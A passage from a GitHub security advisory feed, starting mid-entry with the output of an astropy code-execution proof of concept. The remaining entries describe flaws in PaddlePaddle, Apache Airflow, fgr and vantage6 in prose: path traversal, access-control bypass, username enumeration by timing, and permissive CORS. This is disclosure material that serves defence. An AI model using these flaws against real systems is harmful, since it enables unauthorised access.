  File "/usr/lib/python3.9/subprocess.py", line 1961, in _communicate
    input_view = memoryview(self._input)
TypeError: memoryview: a bytes-like object is required, not 'str'
&gt;&gt;&gt; 
</code></pre>
<pre><code class="language-shell">$ cat /tmp/poc.txt
astrorce
</code></pre>
<h3 id="impact">Impact</h3>
<p>code execution on the user's machine</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/astropy/astropy/security/advisories/GHSA-h2x6-5jx5-46hf">https://github.com/astropy/astropy/security/advisories/GHSA-h2x6-5jx5-46hf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-41334">https://nvd.nist.gov/vuln/detail/CVE-2023-41334</a></li>
<li><a href="https://github.com/astropy/astropy/commit/22057d37b1313f5f5a9b5783df0a091d978dccb5">https://github.com/astropy/astropy/commit/22057d37b1313f5f5a9b5783df0a091d978dccb5</a></li>
<li><a href="https://github.com/astropy/astropy/blob/9b97d98802ee4f5350a62b681c35d8687ee81d91/astropy/coordinates/transformations.py#L539">https://github.com/astropy/astropy/blob/9b97d98802ee4f5350a62b681c35d8687ee81d91/astropy/coordinates/transformations.py#L539</a></li>
<li><a href="https://github.com/advisories/GHSA-h2x6-5jx5-46hf">https://github.com/advisories/GHSA-h2x6-5jx5-46hf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h2x6-5jx5-46hf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-18T20:26:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[paddlepaddle] PaddlePaddle Path Traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-2rp8-hff9-c5wr</id>
        <link href="https://github.com/advisories/GHSA-2rp8-hff9-c5wr"/>
        <updated>2024-03-17T05:01:26.000Z</updated>
        <content type="html"><![CDATA[<p>Arbitrary File Overwrite Via Path Traversal in paddlepaddle/paddle before 2.6</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-0818">https://nvd.nist.gov/vuln/detail/CVE-2024-0818</a></li>
<li><a href="https://huntr.com/bounties/85b06a1b-ac0b-4096-a06d-330891570cd9">https://huntr.com/bounties/85b06a1b-ac0b-4096-a06d-330891570cd9</a></li>
<li><a href="https://github.com/PaddlePaddle/Paddle/commit/5c50d1a8b97b310cbc36560ec36d8377d6f29d7c">https://github.com/PaddlePaddle/Paddle/commit/5c50d1a8b97b310cbc36560ec36d8377d6f29d7c</a></li>
<li><a href="https://github.com/advisories/GHSA-2rp8-hff9-c5wr">https://github.com/advisories/GHSA-2rp8-hff9-c5wr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2rp8-hff9-c5wr</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-03-07T15:30:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Improper Access Control in Apache Airflow]]></title>
        <id>https://github.com/advisories/GHSA-ffw3-6mp6-jmvj</id>
        <link href="https://github.com/advisories/GHSA-ffw3-6mp6-jmvj"/>
        <updated>2024-03-16T05:01:17.000Z</updated>
        <content type="html"><![CDATA[<p>Improper Access Control on Configurations Endpoint for the Stable API of Apache Airflow allows users with Viewer or User role to get Airflow Configurations including sensitive information even when <code>[webserver] expose_config</code> is set to <code>False</code> in <code>airflow.cfg</code>. This allowed a privilege escalation attack. This issue affects Apache Airflow 2.0.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-26559">https://nvd.nist.gov/vuln/detail/CVE-2021-26559</a></li>
<li><a href="https://github.com/apache/airflow/blob/486b76438c0679682cf98cb88ed39c4b161cbcc8/CHANGELOG.txt">https://github.com/apache/airflow/blob/486b76438c0679682cf98cb88ed39c4b161cbcc8/CHANGELOG.txt</a></li>
<li><a href="https://lists.apache.org/thread.html/r3b3787700279ec361308cbefb7c2cce2acb26891a12ce864e4a13c8d%40%3Cusers.airflow.apache.org%3E">https://lists.apache.org/thread.html/r3b3787700279ec361308cbefb7c2cce2acb26891a12ce864e4a13c8d%40%3Cusers.airflow.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rd142565996d7ee847b9c14b8a9921dcf80bc6bc160e3d9dca6dfc2f8@%3Cannounce.apache.org%3E">https://lists.apache.org/thread.html/rd142565996d7ee847b9c14b8a9921dcf80bc6bc160e3d9dca6dfc2f8@%3Cannounce.apache.org%3E</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2021/02/17/1">http://www.openwall.com/lists/oss-security/2021/02/17/1</a></li>
<li><a href="https://github.com/apache/airflow/commit/3909232fafd09ac72b49010ecdfd6ea48f06d5cf">https://github.com/apache/airflow/commit/3909232fafd09ac72b49010ecdfd6ea48f06d5cf</a></li>
<li><a href="https://github.com/apache/airflow/commit/5e35926c7eda0dfa11a9623e4bf5f60c2bd6b3f6">https://github.com/apache/airflow/commit/5e35926c7eda0dfa11a9623e4bf5f60c2bd6b3f6</a></li>
<li><a href="https://github.com/advisories/GHSA-ffw3-6mp6-jmvj">https://github.com/advisories/GHSA-ffw3-6mp6-jmvj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ffw3-6mp6-jmvj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-04-07T21:05:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fgr]  fgr Vulnerable to Insecure Default Variable Initialization]]></title>
        <id>https://github.com/advisories/GHSA-879p-8gw4-mcpw</id>
        <link href="https://github.com/advisories/GHSA-879p-8gw4-mcpw"/>
        <updated>2024-03-15T19:01:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Any users whom would not desire a traceback to be included in their logs whenever an error is raised in their code will be affected.</p>
<p>If users have inadvertently created a scenario in their code that could cause a traceback to include sensitive information <em>and</em> a malicious entity gained access to their log stream, this could create an issue.</p>
<h3 id="patches">Patches</h3>
<p>None yet... users will need to upgrade to <code>0.4.*</code></p>
<h3 id="workarounds">Workarounds</h3>
<p>No particularly reasonable ones at present.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/453.html">https://cwe.mitre.org/data/definitions/453.html</a></li>
<li><a href="https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/stack-trace-disclosure-python/">https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/stack-trace-disclosure-python/</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/dan1hc/fgr/security/advisories/GHSA-879p-8gw4-mcpw">https://github.com/dan1hc/fgr/security/advisories/GHSA-879p-8gw4-mcpw</a></li>
<li><a href="https://github.com/advisories/GHSA-879p-8gw4-mcpw">https://github.com/advisories/GHSA-879p-8gw4-mcpw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-879p-8gw4-mcpw</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-03-15T19:01:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vantage6] vantage6 vulnerable to a username timing attack on recover password/MFA token]]></title>
        <id>https://github.com/advisories/GHSA-5h3x-6gwf-73jm</id>
        <link href="https://github.com/advisories/GHSA-5h3x-6gwf-73jm"/>
        <updated>2024-03-15T16:44:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Much like <a href="https://github.com/vantage6/vantage6/security/advisories/GHSA-45gq-q4xh-cp53">https://github.com/vantage6/vantage6/security/advisories/GHSA-45gq-q4xh-cp53</a>, it is possible to find which usernames exist in vantage6 by calling the API routes <code>/recover/lost</code> and <code>/2fa/lost</code>, which send emails to users if they have lost their password or MFA token. Usernames can be found by assessing response time differences, and additionally, they can be found because the endpoint gives a response "Failed to login" if the username exists.</p>
<h3 id="patches">Patches</h3>
<p>No</p>
<h3 id="workarounds">Workarounds</h3>
<p>No</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vantage6/vantage6/security/advisories/GHSA-45gq-q4xh-cp53">https://github.com/vantage6/vantage6/security/advisories/GHSA-45gq-q4xh-cp53</a></li>
<li><a href="https://github.com/vantage6/vantage6/security/advisories/GHSA-5h3x-6gwf-73jm">https://github.com/vantage6/vantage6/security/advisories/GHSA-5h3x-6gwf-73jm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24770">https://nvd.nist.gov/vuln/detail/CVE-2024-24770</a></li>
<li><a href="https://github.com/vantage6/vantage6/commit/aecfd6d0e83165a41a60ebd52d2287b0217be26b">https://github.com/vantage6/vantage6/commit/aecfd6d0e83165a41a60ebd52d2287b0217be26b</a></li>
<li><a href="https://github.com/advisories/GHSA-5h3x-6gwf-73jm">https://github.com/advisories/GHSA-5h3x-6gwf-73jm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5h3x-6gwf-73jm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-15T16:44:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vantage6] vantage6's CORS settings overly permissive]]></title>
        <id>https://github.com/advisories/GHSA-4946-85pr-fvxh</id>
        <link href="https://github.com/advisories/GHSA-4946-85pr-fvxh"/>
        <updated>2024-03-15T16:42:56.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The vantage6 server has no restrictions on CORS settings. It should be possible for people to set the allowed origins of the server. </p>
<p>The impact is limited because v6 does not use session cookies</p>
<h3 id="patches">Patches</h3>
<p>No</p>
<h3 id="workarounds">Workarounds</h3>
<p>No</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vantage6/vantage6/security/advisories/GHSA-4946-85pr-fvxh">https://github.com/vantage6/vantage6/security/advisories/GHSA-4946-85pr-fvxh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23823">https://nvd.nist.gov/vuln/detail/CVE-2024-23823</a></li>
<li><a href="https://github.com/vantage6/vantage6/commit/70bb4e1d889230a841eb364d6c03accd7dd01a41">https://github.com/vantage6/vantage6/commit/70bb4e1d889230a841eb364d6c03accd7dd01a41</a></li>
<li><a href="https://github.com/advisories/GHSA-4946-85pr-fvxh">https://github.com/advisories/GHSA-4946-85pr-fvxh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4946-85pr-fvxh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-15T16:42:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow: Ignored Airflow Permission]]></title>
        <id>https://github.com/advisories/GHSA-h574-6646-vfxx</id>
        <link href="https://github.com/advisories/GHSA-h574-6646-vfxx"/>
        <updated>2024-03-15T14:19:24.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Airflow, versions 2.8.0 through 2.8.2, has a vulnerability that allows an authenticated user with limited permissions to access resources such as variables, connections, etc from the UI which they do not have permission to access.&nbsp;</p>
<p>Users of Apache Airflow are recommended to upgrade to version 2.8.3 or newer to mitigate the risk associated with this vulnerability</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28746">https://nvd.nist.gov/vuln/detail/CVE-2024-28746</a></li>
<li><a href="https://github.com/apache/airflow/pull/37881">https://github.com/apache/airflow/pull/37881</a></li>
<li><a href="https://lists.apache.org/thread/b4pffc7w7do6qgk4jjbyxvdz5odrvny7">https://lists.apache.org/thread/b4pffc7w7do6qgk4jjbyxvdz5odrvny7</a></li>
<li><a href="https://github.com/apache/airflow/commit/89e7f3e7bdf2126bbbcd959dc10d65ef92773cca">https://github.com/apache/airflow/commit/89e7f3e7bdf2126bbbcd959dc10d65ef92773cca</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2024-46.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2024-46.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-h574-6646-vfxx">https://github.com/advisories/GHSA-h574-6646-vfxx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h574-6646-vfxx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-14T09:31:05.000Z</published>
    </entry>
</feed>